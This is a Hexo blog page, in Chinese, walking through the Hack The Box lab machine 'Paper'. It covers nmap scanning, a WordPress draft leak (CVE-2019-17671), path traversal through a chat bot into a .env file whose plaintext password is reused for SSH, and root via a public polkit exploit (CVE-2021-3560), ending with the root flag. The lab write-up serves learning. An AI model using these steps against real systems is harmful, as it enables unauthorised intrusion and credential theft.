@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Paper is an easy Linux machine that features an Apache server on ports 80 and 443, which are serving the HTTP and HTTPS versions of a website respectively. The website on port 80 returns a default ser">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Paper">
+<meta property="og:url" content="http://dawoxiansigema.github.io/2025/09/17/Paper/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Paper is an easy Linux machine that features an Apache server on ports 80 and 443, which are serving the HTTP and HTTPS versions of a website respectively. The website on port 80 returns a default ser">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/17/Paper/1.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/17/Paper/2.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/17/Paper/3.png">
+<meta property="article:published_time" content="2025-09-17T04:37:12.000Z">
+<meta property="article:modified_time" content="2025-09-22T13:27:29.528Z">
+<meta property="article:author" content="Xu Haoxiang">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/09/17/Paper/1.png">
+
+
+<link rel="canonical" href="http://dawoxiansigema.github.io/2025/09/17/Paper/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://dawoxiansigema.github.io/2025/09/17/Paper/","path":"2025/09/17/Paper/","title":"Paper"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Paper | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-dwight"><span class="nav-number">2.</span> <span class="nav-text">Shell as dwight</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2019-17671"><span class="nav-number">2.1.</span> <span class="nav-text">CVE-2019-17671</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-dwight-1"><span class="nav-number">3.</span> <span class="nav-text">Shell as dwight</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-root"><span class="nav-number">4.</span> <span class="nav-text">Shell as root</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Xu Haoxiang</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/09/17/Paper/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Xu Haoxiang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Paper | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Paper
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-09-17 12:37:12" itemprop="dateCreated datePublished" datetime="2025-09-17T12:37:12+08:00">2025-09-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-09-22 21:27:29" itemprop="dateModified" datetime="2025-09-22T21:27:29+08:00">2025-09-22</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Paper is an easy Linux machine that features an Apache server on ports 80 and 443, which are serving the HTTP and HTTPS versions of a website respectively. The website on port 80 returns a default server webpage but the HTTP response header reveals a hidden domain. This hidden domain is running a WordPress blog, whose version is vulnerable to [CVE-2019-17671]</p>
+<span id="more"></span>
+
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap 10.10.11.143</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-17 12:21 +0800</span><br><span class="line">Nmap scan report for 10.10.11.143 (10.10.11.143)</span><br><span class="line">Host is up (0.44s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br></pre></td></tr></table></figure>
+
+<p>最开始的时候扫描 发现稍微有点奇怪 一个http一个https 但是没有很在意 直接访问发现是一个测试页</p>
+<p><img src="/2025/09/17/Paper/1.png"></p>
+<p>尝试进一步分析 当我用-sCV的时候 发现有点奇怪</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap -sCV 10.10.11.143</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-17 12:28 +0800</span><br><span class="line">Nmap scan report for 10.10.11.143 (10.10.11.143)</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 995 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE    SERVICE   VERSION</span><br><span class="line">22/tcp   open     ssh       OpenSSH 8.0 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)</span><br><span class="line">|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)</span><br><span class="line">|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)</span><br><span class="line">80/tcp   open     http      Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)</span><br><span class="line">|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9</span><br><span class="line">|_http-title: HTTP Server Test Page powered by CentOS</span><br><span class="line">|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">443/tcp  open     ssl/http  Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)</span><br><span class="line">|_http-title: HTTP Server Test Page powered by CentOS</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US</span><br><span class="line">| Subject Alternative Name: DNS:localhost.localdomain</span><br><span class="line">| Not valid before: 2021-07-03T08:52:34</span><br><span class="line">|_Not valid after:  2022-07-08T10:32:34</span><br><span class="line">|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9</span><br><span class="line">5225/tcp filtered hp-server</span><br><span class="line">9290/tcp filtered unknown</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 126.43 seconds</span><br></pre></td></tr></table></figure>
+
+<p><strong>能看到显示的443端口分配给的是测试页</strong> 说明可能存在重定向 抓包后在返回头中看到了后端服务器域名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 403 Forbidden</span><br><span class="line">Date: Wed, 17 Sep 2025 04:34:17 GMT</span><br><span class="line">Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9</span><br><span class="line">X-Backend-Server: office.paper</span><br><span class="line">Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT</span><br><span class="line">ETag: &quot;30c0b-5c5c7fdeec240&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 199691</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>
+
+<p>当然使用CMS扫描能发现是个wordpress的博客框架</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">❯ python3 CmsVulScan.py -u http://office.paper</span><br><span class="line"></span><br><span class="line">  _____            __      __    _  _____</span><br><span class="line"> / ____|           \ \    / /   | |/ ____|</span><br><span class="line">| |     _ __ ___  __\ \  / /   _| | (___   ___ __ _ _ __</span><br><span class="line">| |    | &#x27;_ ` _ \/ __\ \/ / | | | |\___ \ / __/ _` | &#x27;_ \</span><br><span class="line">| |____| | | | | \__ \\  /| |_| | |____) | (_| (_| | | | |</span><br><span class="line"> \_____|_| |_| |_|___/ \/  \__,_|_|_____/ \___\__,_|_| |_|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[12:39:38] [*] Check whether the payload file exists</span><br><span class="line">[12:39:38] [*] All Payload 18780 duplicate removal 6935</span><br><span class="line">[12:39:38] [+] Payload load the success</span><br><span class="line">[12:39:38] [*] CMS recognition of http://office.paper in progress</span><br><span class="line">[12:39:38] [*] Scanning by MD5 mode......</span><br><span class="line">[12:39:41] [*] MD5: 85/3725</span><br><span class="line">[12:39:41] [+] Using MD5 to discover the CMS in path /wp-admin/images/wordpress-logo.png: wordpress</span><br><span class="line">[12:40:38] [*] MD5: 1784/3725</span><br><span class="line">[12:40:38] [+] Using MD5 to discover the CMS in path /wp-includes/js/jcrop/Jcrop.gif: WORDPRESS</span><br></pre></td></tr></table></figure>
+
+<h1 id="Shell-as-dwight"><a href="#Shell-as-dwight" class="headerlink" title="Shell as dwight"></a>Shell as dwight</h1><h2 id="CVE-2019-17671"><a href="#CVE-2019-17671" class="headerlink" title="CVE-2019-17671"></a>CVE-2019-17671</h2><p>再进一步观察发现 版本是5.2.3的 版本还算可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/http/wordpress_scanner) &gt; run</span><br><span class="line">[*] Trying 10.10.11.143</span><br><span class="line">[+] 10.10.11.143 - Detected Wordpress 5.2.3</span><br></pre></td></tr></table></figure>
+
+<p>通过WPScan和多方搜集找到了CVE-2019-17061 但是为什么实际利用起来会是这样的payload确实想不明白 这块还是不太理解 特别只用了一部分的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://office.paper/?static=1</span><br></pre></td></tr></table></figure>
+
+<p>进来之后拿到用户注册地址 并注册一个账号 成功进入下一步</p>
+<p><img src="/2025/09/17/Paper/2.png"></p>
+<h1 id="Shell-as-dwight-1"><a href="#Shell-as-dwight-1" class="headerlink" title="Shell as dwight"></a>Shell as dwight</h1><p>发现这个机器人可以执行cd和cat操作 试一下拿flag</p>
+<p><img src="/2025/09/17/Paper/3.png"></p>
+<p>发现他在装傻 故意不给我() 看了下目录发现这个机器人应该就是在dwight用户下跑的 后边没思路了去看了下HTB给的提示 找到机器人对应的配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!=====Contents of file ../../../home/dwight/hubot/.env=====&gt;</span><br><span class="line">export ROCKETCHAT_URL=&#x27;http://127.0.0.1:48320&#x27;</span><br><span class="line">export ROCKETCHAT_USER=recyclops</span><br><span class="line">export ROCKETCHAT_PASSWORD=Queenofblad3s!23</span><br><span class="line">export ROCKETCHAT_USESSL=false</span><br><span class="line">export RESPOND_TO_DM=true</span><br><span class="line">export RESPOND_TO_EDITED=true</span><br><span class="line">export PORT=8000</span><br><span class="line">export BIND_ADDRESS=127.0.0.1</span><br><span class="line">&lt;!=====End of file ../../../home/dwight/hubot/.env=====&gt;</span><br></pre></td></tr></table></figure>
+
+<p>确实 都是同一个用户的话 密码复用的概率极高 即使真实情况也如此</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ ssh dwight@10.10.11.143</span><br><span class="line">The authenticity of host &#x27;10.10.11.143 (10.10.11.143)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:9utZz963ewD/13oc9IYzRXf6sUEX4xOe/iUaMPTFInQ.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.11.143&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">dwight@10.10.11.143&#x27;s password:</span><br><span class="line">Activate the web console with: systemctl enable --now cockpit.socket</span><br><span class="line"></span><br><span class="line">Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23</span><br><span class="line">[dwight@paper ~]$</span><br></pre></td></tr></table></figure>
+
+<p>至此成功连上SSH 拿到flag</p>
+<h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">❯ ssh dwight@10.10.11.143</span><br><span class="line">dwight@10.10.11.143&#x27;s password:</span><br><span class="line">Activate the web console with: systemctl enable --now cockpit.socket</span><br><span class="line"></span><br><span class="line">Last login: Wed Sep 17 06:39:13 2025 from 10.10.*.*</span><br><span class="line">[dwight@paper ~]$ sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the local System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    #1) Respect the privacy of others.</span><br><span class="line">    #2) Think before you type.</span><br><span class="line">    #3) With great power comes great responsibility.</span><br><span class="line"></span><br><span class="line">[sudo] password for dwight:</span><br><span class="line">Sorry, user dwight may not run sudo on paper.</span><br></pre></td></tr></table></figure>
+
+<p>直接sudo -l发现并没有找到什么有意思的 换种方式试一下 最开始还是先试一下SUID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[dwight@paper ~]$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">...</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>发现了有polkit 这个东西好像有洞 那就传个linpeas上去看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">                                        ╔════════════════════╗</span><br><span class="line">════════════════════════════════════════╣ System Information ╠════════════════════════════════════════</span><br><span class="line">                                        ╚════════════════════╝</span><br><span class="line">╔══════════╣ Operative system</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits</span><br><span class="line">Linux version 4.18.0-348.7.1.el8_5.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-4) (GCC)) #1 SMP Wed Dec 22 13:25:12 UTC 2021</span><br><span class="line">lsb_release Not Found</span><br><span class="line"></span><br><span class="line">╔══════════╣ Sudo version</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version   </span><br><span class="line">Sudo version 1.8.29</span><br><span class="line"></span><br><span class="line">╔══════════╣ CVEs Check</span><br><span class="line">Vulnerable to CVE-2021-3560 </span><br></pre></td></tr></table></figure>
+
+<p>CVE-2021-3560对应的正好就是polkit的洞 找到脚本跑一手 脚本有概率成功 多试几次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation</span><br><span class="line"></span><br><span class="line">[dwight@paper ~]$ bash ./poc.sh</span><br><span class="line"></span><br><span class="line">[!] Username set as : secnigma</span><br><span class="line">[!] No Custom Timing specified.</span><br><span class="line">[!] Timing will be detected Automatically</span><br><span class="line">[!] Force flag not set.</span><br><span class="line">[!] Vulnerability checking is ENABLED!</span><br><span class="line">[!] Starting Vulnerability Checks...</span><br><span class="line">[!] Checking distribution...</span><br><span class="line">[!] Detected Linux distribution as &quot;centos&quot;</span><br><span class="line">[!] Checking if Accountsservice and Gnome-Control-Center is installed</span><br><span class="line">[+] Accounts service and Gnome-Control-Center Installation Found!!</span><br><span class="line">[!] Checking if polkit version is vulnerable</span><br><span class="line">[+] Polkit version appears to be vulnerable!!</span><br><span class="line">[!] Starting exploit...</span><br><span class="line">[!] Inserting Username secnigma...</span><br><span class="line">Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required</span><br><span class="line">[+] Inserted Username secnigma  with UID 1005!</span><br><span class="line">[!] Inserting password hash...</span><br><span class="line">[!] It looks like the password insertion was succesful!</span><br><span class="line">[!] Try to login as the injected user using su - secnigma</span><br><span class="line">[!] When prompted for password, enter your password</span><br><span class="line">[!] If the username is inserted, but the login fails; try running the exploit again.</span><br><span class="line">[!] If the login was succesful,simply enter &#x27;sudo bash&#x27; and drop into a root shell!</span><br><span class="line">[dwight@paper ~]$ su - secnigma</span><br><span class="line">Password:</span><br><span class="line">[secnigma@paper ~]$ sudo bash</span><br><span class="line">[sudo] password for secnigma:</span><br><span class="line">[root@paper secnigma]# cat /root/root.txt</span><br><span class="line">1cffe7d878909bf7f9dd79032d883e68</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HTB/" rel="tag"># HTB</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/15/Devvortex/" rel="prev" title="Devvortex">
+                  <i class="fa fa-angle-left"></i> Devvortex
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/09/20/Writeup/" rel="next" title="Writeup">
+                  Writeup <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Xu Haoxiang</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
